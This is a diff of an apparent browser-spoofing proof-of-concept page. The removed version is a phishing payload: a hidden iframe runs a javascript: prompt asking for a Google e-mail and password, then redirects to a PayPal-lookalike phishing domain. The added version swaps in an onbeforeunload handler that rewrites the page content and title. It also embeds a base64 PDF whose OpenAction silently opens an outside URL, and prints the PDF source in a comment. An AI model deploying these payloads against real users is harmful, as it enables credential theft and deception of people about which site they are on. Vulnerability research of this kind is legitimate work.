@@ -1,26 +1,42 @@
-<html>
-  <body>
 
-    <script>
+<script>
+onbeforeunload=function(){
+	document.write('<b>Welcome to {Some Website}</b>');
+	document.title='OtherWebsite.ltd';
+};
+</script>
+<embed type="application/pdf" src="data:application/pdf;base64,JVBERi0xLjcKIAp0cmFpbGVyCjw8Ci9Sb290IDEgMCBSCj4+CiAKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKL09wZW5BY3Rpb24gMiAwIFIKPj4KZW5kb2JqCiAKMiAwIG9iago8PAovVHlwZSAvQWN0aW9uCi9TIC9VUkkKL1VSSSAoaHR0cDovL3d3dy5mYWNlYm9vay5jb206ODMpCj4+CmVuZG9iagogCiUlRU9G" width="640" height="480">
 
-    function exploit() {
 
-      window.open("https://www.google.com");
+<!--
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+Source of the embeded PDF.
 
-    }
-    
-    </script>
+-------------------------------------
+%PDF-1.7
+ 
+trailer
+<<
+/Root 1 0 R
+>>
+ 
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 2 0 R
+>>
+endobj
+ 
+2 0 obj
+<<
+/Type /Action
+/S /URI
+/URI (http://www.facebook.com:83)
+>>
+endobj
+ 
+%%EOF
+------------------------------------------ 
 
-    <br><br><br><br>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
-</html>
+-->
